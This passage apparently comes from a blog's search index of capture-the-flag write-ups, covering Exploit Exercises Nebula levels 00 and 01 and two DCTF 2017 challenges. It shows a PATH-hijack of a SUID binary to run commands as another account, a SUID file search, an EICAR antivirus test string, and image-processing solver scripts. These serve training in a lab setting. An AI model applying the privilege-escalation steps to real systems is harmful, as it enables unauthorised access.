flag01 flag01 3353 May 18 2011 .bashrc-rw-r--r-- 1 flag01 flag01 675 May 18 2011 .profile-rwsr-x--- 1 flag01 level01 7322 Nov 20 2011 flag01level01@nebula:/home/flag01$Here we can observe the SUID vulnerable application called “flag01” with permission -rwsr-x—. Let’s execute it!level01@nebula:/home/flag01$ ./flag01and now what?Perfect! Let’s observe something on this line:system(\"/usr/bin/env echo and now what?\");As you can observe the above C instruction is calling for a system command, “echo”. Is echo really echo in linux? Yeahhh, until you change it (actually until you make a link between your command and your other command). Let’s finish this!level01@nebula:/home/flag01$ PATH=/tmp:$PATHlevel01@nebula:/home/flag01$ ln -s /bin/getflag /tmp/echolevel01@nebula:/home/flag01$ ./flag01You have successfully executed getflag on a target accountlevel01@nebula:/home/flag01$Fun? Here is the science behind my actions. http://www.cis.syr.edu/~wedu/Teaching/CompSec/LectureNotes_New/Set_UID.pdf http://collaboration.cmc.ec.gc.ca/science/rpn/biblio/ddj/Website/articles/SA/v10/i06/a1.htm" }, { "title": "Exploit Exercises: Nebula Level 00", "url": "/nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-00/", "categories": "nebula, writeups", "tags": "nebula, writeups, level, exploit, exercise, tutorial, solution", "date": "2018-07-16 00:21:00 +0300", "snippet": "This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking direc...", "content": "This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.Alternatively, look at the find man page.To access this level, log in as level00 with the password of level00.Source codeThere is no source code available for this levelSolutionFirst I tried to go to path of flag00 account (generic /home/flag00).level00@nebula:~$ cd /home/flag00/And then I tried to list everything in that folder:level00@nebula:/home/flag00$ lslevel00@nebula:/home/flag00$ ls -altotal 5drwxr-x--- 2 flag00 level00 66 Nov 20 2011 .drwxr-xr-x 1 root root 200 Aug 27 2012 ..-rw-r--r-- 1 flag00 flag00 220 May 18 2011 .bash_logout-rw-r--r-- 1 flag00 flag00 3353 May 18 2011 .bashrc-rw-r--r-- 1 flag00 flag00 675 May 18 2011 .profilelevel00@nebula:/home/flag00$Nothing in it. No Set User ID program. Fine! How do I search at system level for a No Set User ID program? Well, like that:level00@nebula:/home/flag00$ find / -user flag00 -perm -4000 -exec ls -ldb {} \\;-rwsr-x--- 1 flag00 level00 7358 Nov 20 2011 /bin/.../flag00find: `/etc/chatscripts': Permission deniedfind: `/etc/ppp/peers': Permission deniedfind: `/etc/ssl/private': Permission deniedfind: `/home/flag01': Permission deniedfind: `/home/flag02': Permission deniedfind: `/home/flag03': Permission deniedfind: `/home/flag04': Permission deniedfind: `/home/flag05': Permission deniedfind: `/home/flag06': Permission deniedfind: `/home/flag07': Permission deniedfind: `/home/flag08': Permission deniedfind: `/home/flag09': Permission deniedfind: `/home/flag10': Permission deniedfind: `/home/flag11': Permission deniedfind: `/home/flag12': Permission deniedfind: `/home/flag13': Permission deniedfind: `/home/flag14': Permission deniedfind: `/home/flag15': Permission deniedfind: `/home/flag16': Permission deniedfind: `/home/flag17': Permission deniedfind: `/home/flag18': Permission deniedfind: `/home/flag19': Permission deniedfind: `/home/level01': Permission deniedfind: `/home/level02': Permission deniedfind: `/home/level03': Permission deniedfind: `/home/level04': Permission deniedfind: `/home/level05': Permission deniedfind: `/home/level06': Permission deniedfind: `/home/level07': Permission deniedfind: `/home/level08': Permission deniedfind: `/home/level09': Permission deniedfind: `/home/level10': Permission deniedfind: `/home/level11': Permission deniedfind: `/home/level12': Permission deniedfind: `/home/level13': Permission deniedfind: `/home/level14': Permission deniedfind: `/home/level15': Permission deniedfind: `/home/level16': Permission deniedfind: `/home/level17': Permission deniedfind: `/home/level18': Permission deniedfind: `/home/level19': Permission deniedfind: `/home/nebula/.ssh': Permission deniedfind: `/proc/tty/driver': Permission deniedfind: `/proc/1/task/1/fd': Permission deniedfind: `/proc/1/task/1/fdinfo': Permission deniedfind: `/proc/1/task/1/ns': Permission deniedfind: `/proc/1/fd': Permission deniedfind: `/proc/1/fdinfo': Permission deniedfind: `/proc/1/ns': Permission deniedfind: `/proc/2/task/2/fd': Permission deniedfind: `/proc/2/task/2/fdinfo': Permission deniedfind: `/proc/2/task/2/ns': Permission deniedfind: `/proc/2/fd': Permission deniedfind: `/proc/2/fdinfo': Permission deniedfind: `/proc/2/ns': Permission deniedfind: `/proc/3/task/3/fd': Permission deniedfind: `/proc/3/task/3/fdinfo': Permission deniedfind: `/proc/3/task/3/ns': Permission deniedfind: `/proc/3/fd': Permission deniedfind: `/proc/3/fdinfo': Permission deniedfind: `/proc/3/ns': Permission deniedfind: `/proc/6/task/6/fd': Permission deniedfind: `/proc/6/task/6/fdinfo': Permission deniedfind: `/proc/6/task/6/ns': Permission deniedfind: `/proc/6/fd': Permission deniedfind: `/proc/6/fdinfo': Permission deniedfind: `/proc/6/ns': Permission deniedfind: `/proc/7/task/7/fd': Permission deniedfind: `/proc/7/task/7/fdinfo': Permission deniedfind: `/proc/7/task/7/ns': Permission deniedfind: `/proc/7/fd': Permission deniedfind: `/proc/7/fdinfo': Permission deniedfind: `/proc/7/ns': Permission deniedfind: `/proc/8/task/8/fd': Permission deniedfind: `/proc/8/task/8/fdinfo': Permission deniedfind: `/proc/8/task/8/ns': Permission deniedfind: `/proc/8/fd': Permission deniedfind: `/proc/8/fdinfo': Permission deniedfind: `/proc/8/ns': Permission deniedfind: `/proc/9/task/9/fd': Permission deniedfind: `/proc/9/task/9/fdinfo': Permission deniedfind: `/proc/9/task/9/ns': Permission deniedfind: `/proc/9/fd': Permission deniedfind: `/proc/9/fdinfo': Permission deniedfind: `/proc/9/ns': Permission deniedfind: `/proc/10/task/10/fd': Permission deniedfind: `/proc/10/task/10/fdinfo': Permission deniedfind: `/proc/10/task/10/ns': Permission deniedfind: `/proc/10/fd': Permission deniedfind: `/proc/10/fdinfo': Permission deniedfind: `/proc/10/ns': Permission deniedfind: `/proc/11/task/11/fd': Permission deniedfind: `/proc/11/task/11/fdinfo': Permission deniedfind: `/proc/11/task/11/ns': Permission deniedfind: `/proc/11/fd': Permission deniedfind: `/proc/11/fdinfo': Permission deniedfind: `/proc/11/ns': Permission deniedfind: `/proc/12/task/12/fd': Permission deniedfind: `/proc/12/task/12/fdinfo': Permission deniedfind: `/proc/12/task/12/ns': Permission deniedfind: `/proc/12/fd': Permission deniedfind: `/proc/12/fdinfo': Permission deniedfind: `/proc/12/ns': Permission deniedfind: `/proc/13/task/13/fd': Permission deniedfind: `/proc/13/task/13/fdinfo': Permission deniedfind: `/proc/13/task/13/ns': Permission deniedfind: `/proc/13/fd': Permission deniedfind: `/proc/13/fdinfo': Permission deniedfind: `/proc/13/ns': Permission deniedfind: `/proc/14/task/14/fd': Permission deniedfind: `/proc/14/task/14/fdinfo': Permission deniedfind: `/proc/14/task/14/ns': Permission deniedfind: `/proc/14/fd': Permission deniedfind: `/proc/14/fdinfo': Permission deniedfind: `/proc/14/ns': Permission deniedfind: `/proc/15/task/15/fd': Permission deniedfind: `/proc/15/task/15/fdinfo': Permission deniedfind: `/proc/15/task/15/ns': Permission deniedfind: `/proc/15/fd': Permission deniedfind: `/proc/15/fdinfo': Permission deniedfind: `/proc/15/ns': Permission deniedfind: `/proc/16/task/16/fd': Permission deniedfind: `/proc/16/task/16/fdinfo': Permission deniedfind: `/proc/16/task/16/ns': Permission deniedfind: `/proc/16/fd': Permission deniedfind: `/proc/16/fdinfo': Permission deniedfind: `/proc/16/ns': Permission deniedfind: `/proc/18/task/18/fd': Permission deniedfind: `/proc/18/task/18/fdinfo': Permission deniedfind: `/proc/18/task/18/ns': Permission deniedfind: `/proc/18/fd': Permission deniedfind: `/proc/18/fdinfo': Permission deniedfind: `/proc/18/ns': Permission deniedfind: `/proc/20/task/20/fd': Permission deniedfind: `/proc/20/task/20/fdinfo': Permission deniedfind: `/proc/20/task/20/ns': Permission deniedfind: `/proc/20/fd': Permission deniedfind: `/proc/20/fdinfo': Permission deniedfind: `/proc/20/ns': Permission deniedfind: `/proc/21/task/21/fd': Permission deniedfind: `/proc/21/task/21/fdinfo': Permission deniedfind: `/proc/21/task/21/ns': Permission deniedfind: `/proc/21/fd': Permission deniedfind: `/proc/21/fdinfo': Permission deniedfind: `/proc/21/ns': Permission deniedfind: `/proc/22/task/22/fd': Permission deniedfind: `/proc/22/task/22/fdinfo': Permission deniedfind: `/proc/22/task/22/ns': Permission deniedfind: `/proc/22/fd': Permission deniedfind: `/proc/22/fdinfo': Permission deniedfind: `/proc/22/ns': Permission deniedfind: `/proc/23/task/23/fd': Permission deniedfind: `/proc/23/task/23/fdinfo': Permission deniedfind: `/proc/23/task/23/ns': Permission deniedfind: `/proc/23/fd': Permission deniedfind: `/proc/23/fdinfo': Permission deniedfind: `/proc/23/ns': Permission deniedfind: `/proc/24/task/24/fd': Permission deniedfind: `/proc/24/task/24/fdinfo': Permission deniedfind: `/proc/24/task/24/ns': Permission deniedfind: `/proc/24/fd': Permission deniedfind: `/proc/24/fdinfo': Permission deniedfind: `/proc/24/ns': Permission deniedfind: `/proc/25/task/25/fd': Permission deniedfind: `/proc/25/task/25/fdinfo': Permission deniedfind: `/proc/25/task/25/ns': Permission deniedfind: `/proc/25/fd': Permission deniedfind: `/proc/25/fdinfo': Permission deniedfind: `/proc/25/ns': Permission deniedfind: `/proc/26/task/26/fd': Permission deniedfind: `/proc/26/task/26/fdinfo': Permission deniedfind: `/proc/26/task/26/ns': Permission deniedfind: `/proc/26/fd': Permission deniedfind: `/proc/26/fdinfo': Permission deniedfind: `/proc/26/ns': Permission deniedfind: `/proc/34/task/34/fd': Permission deniedfind: `/proc/34/task/34/fdinfo': Permission deniedfind: `/proc/34/task/34/ns': Permission deniedfind: `/proc/34/fd': Permission deniedfind: `/proc/34/fdinfo': Permission deniedfind: `/proc/34/ns': Permission deniedfind: `/proc/35/task/35/fd': Permission deniedfind: `/proc/35/task/35/fdinfo': Permission deniedfind: `/proc/35/task/35/ns': Permission deniedfind: `/proc/35/fd': Permission deniedfind: `/proc/35/fdinfo': Permission deniedfind: `/proc/35/ns': Permission deniedfind: `/proc/36/task/36/fd': Permission deniedfind: `/proc/36/task/36/fdinfo': Permission deniedfind: `/proc/36/task/36/ns': Permission deniedfind: `/proc/36/fd': Permission deniedfind: `/proc/36/fdinfo': Permission deniedfind: `/proc/36/ns': Permission deniedfind: `/proc/37/task/37/fd': Permission deniedfind: `/proc/37/task/37/fdinfo': Permission deniedfind: `/proc/37/task/37/ns': Permission deniedfind: `/proc/37/fd': Permission deniedfind: `/proc/37/fdinfo': Permission deniedfind: `/proc/37/ns': Permission deniedfind: `/proc/38/task/38/fd': Permission deniedfind: `/proc/38/task/38/fdinfo': Permission deniedfind: `/proc/38/task/38/ns': Permission deniedfind: `/proc/38/fd': Permission deniedfind: `/proc/38/fdinfo': Permission deniedfind: `/proc/38/ns': Permission deniedfind: `/proc/58/task/58/fd': Permission deniedfind: `/proc/58/task/58/fdinfo': Permission deniedfind: `/proc/58/task/58/ns': Permission deniedfind: `/proc/58/fd': Permission deniedfind: `/proc/58/fdinfo': Permission deniedfind: `/proc/58/ns': Permission deniedfind: `/proc/298/task/298/fd': Permission deniedfind: `/proc/298/task/298/fdinfo': Permission deniedfind: `/proc/298/task/298/ns': Permission deniedfind: `/proc/298/fd': Permission deniedfind: `/proc/298/fdinfo': Permission deniedfind: `/proc/298/ns': Permission deniedfind: `/proc/691/task/691/fd': Permission deniedfind: `/proc/691/task/691/fdinfo': Permission deniedfind: `/proc/691/task/691/ns': Permission deniedfind: `/proc/691/fd': Permission deniedfind: `/proc/691/fdinfo': Permission deniedfind: `/proc/691/ns': Permission deniedfind: `/proc/697/task/697/fd': Permission deniedfind: `/proc/697/task/697/fdinfo': Permission deniedfind: `/proc/697/task/697/ns': Permission deniedfind: `/proc/697/task/712/fd': Permission deniedfind: `/proc/697/task/712/fdinfo': Permission deniedfind: `/proc/697/task/712/ns': Permission deniedfind: `/proc/697/task/713/fd': Permission deniedfind: `/proc/697/task/713/fdinfo': Permission deniedfind: `/proc/697/task/713/ns': Permission deniedfind: `/proc/697/task/714/fd': Permission deniedfind: `/proc/697/task/714/fdinfo': Permission deniedfind: `/proc/697/task/714/ns': Permission deniedfind: `/proc/697/fd': Permission deniedfind: `/proc/697/fdinfo': Permission deniedfind: `/proc/697/ns': Permission deniedfind: `/proc/699/task/699/fd': Permission deniedfind: `/proc/699/task/699/fdinfo': Permission deniedfind: `/proc/699/task/699/ns': Permission deniedfind: `/proc/699/fd': Permission deniedfind: `/proc/699/fdinfo': Permission deniedfind: `/proc/699/ns': Permission deniedfind: `/proc/709/task/709/fd': Permission deniedfind: `/proc/709/task/709/fdinfo': Permission deniedfind: `/proc/709/task/709/ns': Permission deniedfind: `/proc/709/fd': Permission deniedfind: `/proc/709/fdinfo': Permission deniedfind: `/proc/709/ns': Permission deniedfind: `/proc/793/task/793/fd': Permission deniedfind: `/proc/793/task/793/fdinfo': Permission deniedfind: `/proc/793/task/793/ns': Permission deniedfind: `/proc/793/fd': Permission deniedfind: `/proc/793/fdinfo': Permission deniedfind: `/proc/793/ns': Permission deniedfind: `/proc/794/task/794/fd': Permission deniedfind: `/proc/794/task/794/fdinfo': Permission deniedfind: `/proc/794/task/794/ns': Permission deniedfind: `/proc/794/fd': Permission deniedfind: `/proc/794/fdinfo': Permission deniedfind: `/proc/794/ns': Permission deniedfind: `/proc/874/task/874/fd': Permission deniedfind: `/proc/874/task/874/fdinfo': Permission deniedfind: `/proc/874/task/874/ns': Permission deniedfind: `/proc/874/fd': Permission deniedfind: `/proc/874/fdinfo': Permission deniedfind: `/proc/874/ns': Permission deniedfind: `/proc/898/task/898/fd': Permission deniedfind: `/proc/898/task/898/fdinfo': Permission deniedfind: `/proc/898/task/898/ns': Permission deniedfind: `/proc/898/fd': Permission deniedfind: `/proc/898/fdinfo': Permission deniedfind: `/proc/898/ns': Permission deniedfind: `/proc/973/task/973/fd': Permission deniedfind: `/proc/973/task/973/fdinfo': Permission deniedfind: `/proc/973/task/973/ns': Permission deniedfind: `/proc/973/fd': Permission deniedfind: `/proc/973/fdinfo': Permission deniedfind: `/proc/973/ns': Permission deniedfind: `/proc/1000/task/1000/fd': Permission deniedfind: `/proc/1000/task/1000/fdinfo': Permission deniedfind: `/proc/1000/task/1000/ns': Permission deniedfind: `/proc/1000/fd': Permission deniedfind: `/proc/1000/fdinfo': Permission deniedfind: `/proc/1000/ns': Permission deniedfind: `/proc/1044/task/1044/fd': Permission deniedfind: `/proc/1044/task/1044/fdinfo': Permission deniedfind: `/proc/1044/task/1044/ns': Permission deniedfind: `/proc/1044/fd': Permission deniedfind: `/proc/1044/fdinfo': Permission deniedfind: `/proc/1044/ns': Permission deniedfind: `/proc/1047/task/1047/fd': Permission deniedfind: `/proc/1047/task/1047/fdinfo': Permission deniedfind: `/proc/1047/task/1047/ns': Permission deniedfind: `/proc/1047/fd': Permission deniedfind: `/proc/1047/fdinfo': Permission deniedfind: `/proc/1047/ns': Permission deniedfind: `/proc/1052/task/1052/fd': Permission deniedfind: `/proc/1052/task/1052/fdinfo': Permission deniedfind: `/proc/1052/task/1052/ns': Permission deniedfind: `/proc/1052/fd': Permission deniedfind: `/proc/1052/fdinfo': Permission deniedfind: `/proc/1052/ns': Permission deniedfind: `/proc/1053/task/1053/fd': Permission deniedfind: `/proc/1053/task/1053/fdinfo': Permission deniedfind: `/proc/1053/task/1053/ns': Permission deniedfind: `/proc/1053/fd': Permission deniedfind: `/proc/1053/fdinfo': Permission deniedfind: `/proc/1053/ns': Permission deniedfind: `/proc/1055/task/1055/fd': Permission deniedfind: `/proc/1055/task/1055/fdinfo': Permission deniedfind: `/proc/1055/task/1055/ns': Permission deniedfind: `/proc/1055/fd': Permission deniedfind: `/proc/1055/fdinfo': Permission deniedfind: `/proc/1055/ns': Permission deniedfind: `/proc/1061/task/1061/fd': Permission deniedfind: `/proc/1061/task/1061/fdinfo': Permission deniedfind: `/proc/1061/task/1061/ns': Permission deniedfind: `/proc/1061/fd': Permission deniedfind: `/proc/1061/fdinfo': Permission deniedfind: `/proc/1061/ns': Permission deniedfind: `/proc/1062/task/1062/fd': Permission deniedfind: `/proc/1062/task/1062/fdinfo': Permission deniedfind: `/proc/1062/task/1062/ns': Permission deniedfind: `/proc/1062/fd': Permission deniedfind: `/proc/1062/fdinfo': Permission deniedfind: `/proc/1062/ns': Permission deniedfind: `/proc/1138/task/1138/fd': Permission deniedfind: `/proc/1138/task/1138/fdinfo': Permission deniedfind: `/proc/1138/task/1138/ns': Permission deniedfind: `/proc/1138/fd': Permission deniedfind: `/proc/1138/fdinfo': Permission deniedfind: `/proc/1138/ns': Permission deniedfind: `/proc/1148/task/1148/fd': Permission deniedfind: `/proc/1148/task/1148/fdinfo': Permission deniedfind: `/proc/1148/task/1148/ns': Permission deniedfind: `/proc/1148/fd': Permission deniedfind: `/proc/1148/fdinfo': Permission deniedfind: `/proc/1148/ns': Permission deniedfind: `/proc/1155/task/1155/fd': Permission deniedfind: `/proc/1155/task/1155/fdinfo': Permission deniedfind: `/proc/1155/task/1155/ns': Permission deniedfind: `/proc/1155/fd': Permission deniedfind: `/proc/1155/fdinfo': Permission deniedfind: `/proc/1155/ns': Permission deniedfind: `/proc/2750/task/2750/fd': Permission deniedfind: `/proc/2750/task/2750/fdinfo': Permission deniedfind: `/proc/2750/task/2750/ns': Permission deniedfind: `/proc/2750/fd': Permission deniedfind: `/proc/2750/fdinfo': Permission deniedfind: `/proc/2750/ns': Permission deniedfind: `/proc/2764/task/2764/fd': Permission deniedfind: `/proc/2764/task/2764/fdinfo': Permission deniedfind: `/proc/2764/task/2764/ns': Permission deniedfind: `/proc/2764/fd': Permission deniedfind: `/proc/2764/fdinfo': Permission deniedfind: `/proc/2764/ns': Permission deniedfind: `/proc/2912/task/2912/fd/5': No such file or directoryfind: `/proc/2912/task/2912/fdinfo/5': No such file or directoryfind: `/proc/2912/fd/5': No such file or directoryfind: `/proc/2912/fdinfo/5': No such file or directoryfind: `/root': Permission deniedfind: `/sys/kernel/debug': Permission deniedfind: `/var/cache/ldconfig': Permission deniedfind: `/var/lib/php5': Permission deniedfind: `/var/lib/sudo': Permission deniedfind: `/var/spool/cron/atjobs': Permission deniedfind: `/var/spool/cron/atspool': Permission deniedfind: `/var/spool/cron/crontabs': Permission denied-rwsr-x--- 1 flag00 level00 7358 Nov 20 2011 /rofs/bin/.../flag00find: `/rofs/etc/chatscripts': Permission deniedfind: `/rofs/etc/ppp/peers': Permission deniedfind: `/rofs/etc/ssl/private': Permission deniedfind: `/rofs/home/flag01': Permission deniedfind: `/rofs/home/flag02': Permission deniedfind: `/rofs/home/flag03': Permission deniedfind: `/rofs/home/flag04': Permission deniedfind: `/rofs/home/flag05': Permission deniedfind: `/rofs/home/flag06': Permission deniedfind: `/rofs/home/flag07': Permission deniedfind: `/rofs/home/flag08': Permission deniedfind: `/rofs/home/flag09': Permission deniedfind: `/rofs/home/flag10': Permission deniedfind: `/rofs/home/flag11': Permission deniedfind: `/rofs/home/flag12': Permission deniedfind: `/rofs/home/flag13': Permission deniedfind: `/rofs/home/flag14': Permission deniedfind: `/rofs/home/flag15': Permission deniedfind: `/rofs/home/flag16': Permission deniedfind: `/rofs/home/flag17': Permission deniedfind: `/rofs/home/flag18': Permission deniedfind: `/rofs/home/flag19': Permission deniedfind: `/rofs/home/level01': Permission deniedfind: `/rofs/home/level02': Permission deniedfind: `/rofs/home/level03': Permission deniedfind: `/rofs/home/level04': Permission deniedfind: `/rofs/home/level05': Permission deniedfind: `/rofs/home/level06': Permission deniedfind: `/rofs/home/level07': Permission deniedfind: `/rofs/home/level08': Permission deniedfind: `/rofs/home/level09': Permission deniedfind: `/rofs/home/level10': Permission deniedfind: `/rofs/home/level11': Permission deniedfind: `/rofs/home/level12': Permission deniedfind: `/rofs/home/level13': Permission deniedfind: `/rofs/home/level14': Permission deniedfind: `/rofs/home/level15': Permission deniedfind: `/rofs/home/level16': Permission deniedfind: `/rofs/home/level17': Permission deniedfind: `/rofs/home/level18': Permission deniedfind: `/rofs/home/level19': Permission deniedfind: `/rofs/home/nebula/.ssh': Permission deniedfind: `/rofs/root': Permission deniedfind: `/rofs/var/cache/ldconfig': Permission deniedfind: `/rofs/var/lib/php5': Permission deniedfind: `/rofs/var/lib/sudo': Permission deniedfind: `/rofs/var/spool/cron/atjobs': Permission deniedfind: `/rofs/var/spool/cron/atspool': Permission deniedfind: `/rofs/var/spool/cron/crontabs': Permission deniedlevel00@nebula:/home/flag00$Now that we found out the location (-rwsr-x— 1 flag00 level00 7358 Nov 20 2011 /rofs/bin/…​/flag00) let’s go there:level00@nebula:/home/flag00$ cd /rofs/bin/.../level00@nebula:/rofs/bin/...$ ls -altotal 8drwxr-xr-x 2 root root 29 Nov 20 2011 .drwxr-xr-x 3 root root 2728 Aug 18 2012 ..-rwsr-x--- 1 flag00 level00 7358 Nov 20 2011 flag00level00@nebula:/rofs/bin/...$And as the last step we have to run flag00 and getflag.level00@nebula:/rofs/bin/...$ ./flag00Congrats, now run getflag to get your flag!flag00@nebula:/rofs/bin/...$ getflagYou have successfully executed getflag on a target accountflag00@nebula:/rofs/bin/...$From now, our main task will be to run getflag on a target account (example flagNN, where NN is the number of the level). The valid response in order to finish your level is: “You have successfully executed getflag on a target account”." }, { "title": "[DCTF 2017] Working Junks Writeup", "url": "/nitesculucian.github.io/2018/07/15/dctf-2017-working-junks-writeup/", "categories": "dctf, writeups", "tags": "DCTF, DefCamp, 2017, writeups, CTF, challange", "date": "2018-07-15 17:49:00 +0300", "snippet": "Description:https://snag.gy/1hqQnF.jpgAuthor:Lucian NitescuStats:162 points / 55 solversSolution:First of all the above given description is a reference to the junk (the ship/boat) and the red line...", "content": "Description:https://snag.gy/1hqQnF.jpgAuthor:Lucian NitescuStats:162 points / 55 solversSolution:First of all the above given description is a reference to the junk (the ship/boat) and the red line below is a reference to the “in reverse”.The challenge start with:mehuser:~$ file ee: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=20712db5ad286fbbcfe0005d23d8cbcc3965cffa, not strippedAfter we run this 64-bit ELF we got three things (hints):mehuser:~$ chmod +x ./emehuser:~$ ./e?em wonk uoy oD !!!olleH!sdnatsrednu eno on taht yrots gib a evah I dnA !RACIE si eman yM!edoc ym si siht dnA*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP4[PA@P!O5XX5O!P%@AP[4PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\u0013~\u0004j\u001bn\u001b\u0010\u001b\u0011\u0013~c\u001b\u0015b|6o\u0002\u0019f\u0018\u001f\u0019f\u0002jo\u0003`\u0003af\u001f\u0018\u001ffm\u0017}\u0018\u0003\u0002ml\u0006qo\u001b\u001bqo%|\u001d\u0011\u001b\u0019u \u0019\u0016\u001c\u0019\u001cu\u0019\u0016 \u0011\u0011u \u001d u\u001e\u0011\u0014\u001dy|\u0010s\u0010r7Z N?J/.?4[?57Z[G?1FX,,FX\u0012K*&amp;,.=B&lt;;.!+.=+B.!;&amp;9&amp;=:&lt;B;*&lt;;B)&amp;#*NK'D'EX5O!P\u00013.000000, 4.000000, 5.000000 &lt;snip of more junks&gt; We have junk, intended junk. We have strings in reverse. We have an eicar code missing characters because of “\" (you can check with strings also)Reverse everything in python with this script:# 1.pyf = open(\"e\", \"r\")buf = f.read()f.close()buf = buf.encode(\"hex\")buf = buf[::-1]f = open(\"sol\", \"w\")f.write(buf.decode(\"hex\"))f.close()And then use binwalk to extract something from the junk!mehuser:~$ python ./rev.py mehuser:~$ binwalk solDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------11576 0x2D38 PNG image, 862 x 171, 8-bit/color RGB, non-interlacedSo we got to extract a PNG file that was stored in a string (reversed hex dump of the PNG file) in the first place.The flag is: DCTF{63a47eb3bcfade799a44e0560e891c25029e442e538276fb403975d18f93d88e}" }, { "title": "[DCTF 2017] Security CCTV Writeup", "url": "/nitesculucian.github.io/2018/07/15/dctf-2017-security-cctv-writeup/", "categories": "dctf, writeups", "tags": "DCTF, DefCamp, 2017, writeups, CTF, challange", "date": "2018-07-15 17:44:00 +0300", "snippet": "Description:We really need that token. Can you take it? https://security-cctv.dctf-f1nals-2017.def.camp/.Author:Lucian NitescuStats:374 point / 7 solversSolution:The challenge started with this pag...", "content": "Description:We really need that token. Can you take it? https://security-cctv.dctf-f1nals-2017.def.camp/.Author:Lucian NitescuStats:374 point / 7 solversSolution:The challenge started with this page:There you can observe the QR code an his reflection on the laptop:And also you can observe the time and date (Date: 2017-11-13 09:42:10.725649) which will be changed at every minute with the photo itself. On the server side there is a cron job of a python script which will generate a random QR code which will be inserted in the “frame” image.Using the following python script we can extract the QR code from the image and retrive the token.import pyqrcodeimport stringimport randomimport png import ImageOpsimport ImageDrawimport numpyfrom PIL import Image, ImageEnhanceimport urllibimport qrtoolsfrom qrtools import QRdef transformblit(src_tri, dst_tri, src_img, dst_img): ((x11,x12), (x21,x22), (x31,x32)) = src_tri ((y11,y12), (y21,y22), (y31,y32)) = dst_tri M = numpy.array([ [y11, y12, 1, 0, 0, 0], [y21, y22, 1, 0, 0, 0], [y31, y32, 1, 0, 0, 0], [0, 0, 0, y11, y12, 1], [0, 0, 0, y21, y22, 1], [0, 0, 0, y31, y32, 1] ]) y = numpy.array([x11, x21, x31, x12, x22, x32]) A = numpy.linalg.solve(M, y) src_copy = src_img.copy() srcdraw = ImageDraw.Draw(src_copy) srcdraw.polygon(src_tri) transformed = src_img.transform(dst_img.size, Image.AFFINE, A) mask = Image.new('1', dst_img.size) maskdraw = ImageDraw.Draw(mask) maskdraw.polygon(dst_tri, fill=0) dstdraw = ImageDraw.Draw(dst_img) dstdraw.polygon(dst_tri, fill=(0,0,0,0)) dst_img.paste(transformed, mask=mask)def randomg(size=6, chars=string.ascii_uppercase + string.digits): return ''.join(random.choice(chars) for x in range(size))# hell gose lose here# http://13.81.248.25/qr/img/streamframe.pngurllib.urlretrieve(\"http://13.81.248.25/qr/img/streamframe.png\", \"streamframe.png\" )qr = Image.open(\"streamframe.png\").convert(\"RGBA\")blank = Image.new(\"RGBA\", (4608, 2529), (0,0,0,0))#Start: Part 1 of the QR codepart1 = qr.crop((2089, 1558, 2358, 1723))contrast = ImageEnhance.Contrast(part1)part1 = contrast.enhance(1.6)part1 = part1.rotate(22, resample=Image.BICUBIC, expand=True)width, height = part1.sizem = -0.62xshift = abs(m) * widthnew_width = width + int(round(xshift))part1 = part1.transform((new_width, height), Image.AFFINE, (1, m, -xshift if m &gt; 0 else 0, 0, 1.43, 0), Image.BILINEAR)part1 = part1.resize((285, 285), Image.ANTIALIAS)part1 = part1.resize((800, 800), Image.ANTIALIAS)# junk trimmingtri1 = [(10,10), (20,20), (10,20)]tri2 = [(10,10), (212,100), (208,800)]transformblit(tri1, tri2, blank, part1)tri2 = [(150,500), (211,280), (600,800)]transformblit(tri1, tri2, blank, part1)tri2 = [(300,420), (470,420), (600,800)]transformblit(tri1, tri2, blank, part1)tri2 = [(470,420), (470,100), (900,600)]transformblit(tri1, tri2, blank, part1)tri2 = [(100,140), (470,140), (800,10)]transformblit(tri1, tri2, blank, part1)tri2 = [(344,218), (365,0), (800,670)]transformblit(tri1, tri2, blank, part1)# final trimpart1 = part1.crop((213, 141, 469, 419))contrast = ImageEnhance.Contrast(part1)part1 = contrast.enhance(1.5)#Start: Part 2 of the QR codepart2 = qr.crop((2031, 1584, 2287, 1742))contrast = ImageEnhance.Contrast(part2)part2 = contrast.enhance(2.7)part2 = ImageOps.mirror(part2)part2 = part2.rotate(0+20-4, resample=Image.BICUBIC, expand=True)width, height = part2.sizem = -0.49xshift = abs(m) * widthnew_width = width + int(round(xshift))part2 = part2.transform((new_width, height), Image.AFFINE, (1.1, m, -xshift if m &gt; 0 else 0, 0, 1.605, 0), Image.BILINEAR)part2 = part2.resize((800, 700), Image.ANTIALIAS)contrast = ImageEnhance.Contrast(part2)part2 = contrast.enhance(1.2)part2 = part2.crop((245, 80, 393, 301))tri1 = [(10,10), (20,20), (10,20)]tri2 = [(0,0), (0,220), (100,220)]transformblit(tri1, tri2, blank, part2)part2 = part2.resize((240, 278), Image.ANTIALIAS)blank2 = Image.new(\"RGBA\", (278, 278), (0,0,0,0))contrast = ImageEnhance.Contrast(part2)part2 = contrast.enhance(1.6)blank2.paste(part2, (12, 4), part2)blank2.paste(part1, (0, 0), part1)blank2.save(\"./sol.png\", \"PNG\")part1.save(\"./part1.png\", \"PNG\")part2.save(\"./part2.png\", \"PNG\")myCode = QR(filename=u\"./sol.png\")if myCode.decode(): print myCode.data_to_string()Example of “phone” QR code retrieval:part1 = qr.crop((2089, 1558, 2358, 1723))contrast = ImageEnhance.Contrast(part1)part1 = contrast.enhance(1.6)part1 = part1.rotate(22, resample=Image.BICUBIC, expand=True)width, height = part1.sizem = -0.62xshift = abs(m) * widthnew_width = width + int(round(xshift))part1 = part1.transform((new_width, height), Image.AFFINE, (1, m, -xshift if m &gt; 0 else 0, 0, 1.43, 0), Image.BILINEAR)part1 = part1.resize((285, 285), Image.ANTIALIAS)part1 = part1.resize((800, 800), Image.ANTIALIAS)# junk trimmingtri1 = [(10,10), (20,20), (10,20)]tri2 = [(10,10), (212,100), (208,800)]transformblit(tri1, tri2, blank, part1)tri2 = [(150,500), (211,280), (600,800)]transformblit(tri1, tri2, blank, part1)tri2 = [(300,420), (470,420), (600,800)]transformblit(tri1, tri2, blank, part1)tri2 = [(470,420), (470,100), 